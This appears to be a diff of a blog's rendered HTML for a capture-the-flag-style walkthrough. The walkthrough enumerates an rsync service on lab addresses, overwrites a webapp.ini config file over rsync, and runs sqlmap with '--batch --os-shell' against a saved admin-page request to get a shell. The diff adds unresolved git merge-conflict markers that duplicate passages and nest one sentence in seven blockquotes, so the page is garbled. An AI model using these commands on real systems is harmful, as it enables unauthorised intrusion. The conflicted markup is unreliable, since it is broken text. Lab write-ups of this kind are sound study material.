@@ -271,17 +271,33 @@ Progress: <span style="color:#ae81ff">56672</span> / <span style="color:#ae81ff"
 
 </code></pre></div><p>##Visting Webpage</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.97.133/admin
+<span style="color:#f92672">&lt;&lt;&lt;&lt;&lt;&lt;</span>&lt; HEAD
 
 </code></pre></div><p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <p>Viewing <code>source code</code></p>
 <p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <p>##Rsync Enumeration</p>
 <p>We have port 873 running which is <code>Rsync</code> you can read more about this here<a href="https://book.hacktricks.xyz/pentesting/873-pentesting-rsync">hacktricks.xyz/pentesting/873-pentesting-rsync</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rsync -rdt rsync://10.10.38.244:873
+<p>=======</p>
+<pre><code>
+&lt;img style=&quot;border:2px solid black&quot; src=&quot;/images/My_New_Hugo_Site.png&quot; align=&quot;left&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+
+
+Viewing `source code` 
+
+&lt;img style=&quot;border:2px solid black&quot; src=&quot;/images/My_New_Hugo_Site.png&quot; align=&quot;left&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+
+##Rsync Enumeration
+
+We have port 873 running which is `Rsync` you can read more about this here[hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)
+
+&gt;&gt;&gt;&gt;&gt;&gt;&gt; 851a5582408dd1b3b28c829852ad6b894439a2e3
+```bash
+rsync -rdt rsync://10.10.38.244:873
 
 we get | Conf            All Confs |
 
-</code></pre></div><p>Listing content of <code>Conf</code></p>
+</code></pre><p>Listing content of <code>Conf</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 rsync -rdt rsync://10.10.38.244:873/Conf
 drwxrwxrwx          4,096 2021/04/11 01:33:08 .
@@ -315,11 +331,32 @@ Local <span style="color:#f92672">=</span> No
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
 rsync -av webapp.ini rsync://10.10.101.93:873/Conf/webapp.ini  
 
-</code></pre></div><p>Accessing the admin page again  <code>http://10.10.101.93/admin/</code></p>
+</code></pre></div><p>&laquo;&laquo;&laquo;&lt; HEAD</p>
+<p>Accessing the admin page again  <code>http://10.10.101.93/admin/</code></p>
 <p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <p>Use <code>brupsuite</code> and saving the request as <code>req.txt</code> file</p>
 <p>##SQLmap</p>
-<p>use sqlmap <code>batch mode</code> so that it doesn&rsquo;t ask for inputs and <code>os-shell</code> to get the shell.</p>
+<p>=======</p>
+<p>Accessing the admin page again  <code>http://10.10.101.93/admin/</code></p>
+<p><img style="border:2px solid black" src="/images/My_New_Hugo_Site.png" align="left"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></p>
+<p>Use <code>brupsuite</code> and saving the request as <code>req.txt</code> file</p>
+<p>##SQLmap</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>851a5582408dd1b3b28c829852ad6b894439a2e3
+use sqlmap <code>batch mode</code> so that it doesn&rsquo;t ask for inputs and <code>os-shell</code> to get the shell.</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r req.txt --level <span style="color:#ae81ff">3</span> --risk <span style="color:#ae81ff">3</span> --batch --os-shell
 
 </code></pre></div><p>we get permission denied when try to run these command ..
